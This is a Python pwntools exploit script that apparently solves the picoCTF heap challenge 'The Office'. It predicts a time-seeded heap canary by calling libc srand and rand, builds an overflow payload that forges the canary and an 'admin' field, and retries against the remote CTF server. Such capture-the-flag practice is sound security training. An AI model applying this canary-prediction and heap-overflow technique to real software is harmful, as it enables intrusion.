import struct
import sys
from pwn import *
from ctypes import CDLL

#####################################################change directory#################################3
level = "The Office"
ip = "mercury.picoctf.net:4686"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

########################################operation mode#########################################
args.DEBUG = False
args.REMOTE = True
#####################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/the_office")
#######################################start process#############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG:
        return gdb.debug(binary.path, gdbscript="break *0x400947\nc\nx/24wx 0x601058\n")
    else:
        return process([binary.path])

################################getting input###################################################
def add_user(r, name, phone):
    r.sendlineafter("token", b"1")
    r.sendlineafter("Name:", name)
    r.sendlineafter("?", b"n")
    r.sendlineafter("Salary:", b"1")
    r.sendlineafter(":", phone)
    r.sendlineafter("?", b"n")

def remove_user(r, id):
    r.sendlineafter("token", b"2")
    r.sendlineafter("?", id)

def get_flag(r, id):
    r.sendlineafter("token", b"2")
    r.sendlineafter("?", id)

for i in range(100):
    r = conn()
#######################################setup clock and canary########################################
    CLOCK_OFFSET = i+1
    libc = CDLL('libc.so.6')
    libc.srand(libc.time(None) + CLOCK_OFFSET)
    canary = libc.rand()
    overflow = b"1"*28 + struct.pack("i",canary) + struct.pack("i", 0x35) + struct.pack("i", 0x35) + b"admin"
######################################simple interaction######################################
    add_user(r, b"aaaa", b"1")
    add_user(r, b"bbbb", b"1")
    remove_user(r, b"0")
    add_user(r, b"cccc", overflow)
    log.info(r.recvline())
    s = str(r.recvline())
    log.info(s)
    if not s.__contains__("heap smashing detected"):
        r.sendlineafter("token", b"4")
        r.sendlineafter("?", b"1")
        r.interactive()
        break
    log.info("wrong offset " + str(CLOCK_OFFSET))